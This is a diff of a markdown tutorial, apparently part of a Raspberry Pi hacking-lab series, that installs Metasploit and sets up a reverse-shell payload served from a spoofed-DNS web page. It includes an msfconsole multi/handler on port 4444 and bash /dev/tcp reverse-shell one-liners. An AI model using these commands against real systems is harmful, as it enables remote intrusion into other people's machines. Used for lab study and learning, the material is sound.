@@ -6,6 +6,14 @@ With Metasploit, you have many attack possibilities, in this tutorial I will jus
 
 The aim of this tutorial is to install Metasploit on Raspberry PI and to provide a tiny download (_TCP reverse shell_) on spoofed DNS web page.
 
+## Precondition
+
+- [Setup Raspberry PI](../Setup)
+- [Prepare Raspberry PI](../Preparation)
+- [Simple Access Point](../AccessPoint)
+- [DNS Analysis](../DNSAnalysis)
+- [DNS Redirection](../DNSRedirection)
+
 ## Install needed and/or optional packages
 
 Install (_or ensure they are installed_) following packages.
@@ -30,7 +38,9 @@ For the Metasploit (_first steps_) section, and the Metaslpoit/Msfvenom (_final 
 $ mkdir /var/www/html/{images,styles,scripts,data}
 ```
 
-## Install and start Metasploit
+## Metasploit
+
+### Install Metasploit
 
 ```shell
 # download latest install script
@@ -41,12 +51,16 @@ $ chmod u+x msfinstall
 
 # start installation
 $ sudo ./msfinstall
+```
 
+### Start Metasploit
+
+```shell
 # start msfconsole
 $ msfconsole
 ```
 
-Start the initial msfconsole (_incl. Metasploit version_), this will also set up your database.
+Start the initial msfconsole, this will also set up your database.
 
 ```
 Would you like to use and setup a new database (recommended)? y
@@ -56,7 +70,9 @@ Initial MSF web service account password? (Leave blank for random password):
 
 Please store these credentials!!!
 
-## Metasploit (_first steps_)
+## First steps with Metasploit
+
+This section should show you the first steps with Metasploit, in case this awesome tool is new to you.
 
 ```shell
 # add workspace (and switch)
@@ -98,7 +114,7 @@ msf6 auxiliary(scanner/http/dir_scanner) > run
 msf6 auxiliary(scanner/http/dir_scanner) > quit
 ```
 
-## Metaslpoit/Msfvenom (_final attack_)
+## The final attack with Metaslpoit and Msfvenom
 
 ### Generate some exploits
 
@@ -220,7 +236,7 @@ msf6 exploit(multi/handler) > info
 # show options (optional)
 msf6 exploit(multi/handler) > options
 
-# set lhost
+# set LHOST
 msf6 exploit(multi/handler) > set LHOST 192.168.0.1
 
 # start multi/handler
@@ -232,9 +248,10 @@ msf6 exploit(multi/handler) > run
 
 You can now wait or just test it yourself (_without a payload, of course_).
 
-With a 2nd tty you can check if port 4444 is listen on Raspberry PI.
+With a 2nd terminal session, you can check the port 4444 on Raspberry PI.
 
 ```shell
+# show if port 4444 is listen
 pi@raspberrypi:~ $ ss -tl | grep 4444
 LISTEN   0        256          192.168.0.1:4444                  0.0.0.0:* 
 ```
@@ -242,9 +259,11 @@ LISTEN   0        256          192.168.0.1:4444                  0.0.0.0:*
 On other own device(s) you can establish a reverse shell.
 
 ```shell
+# if SHELL is Bash
 ┌──[lupin@centos]::[~]
 └─ % /bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1
 
+# if SHELL is ZSH
 ┌──[lupin@macOS]::[~]
 └─ % /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1"
 ```
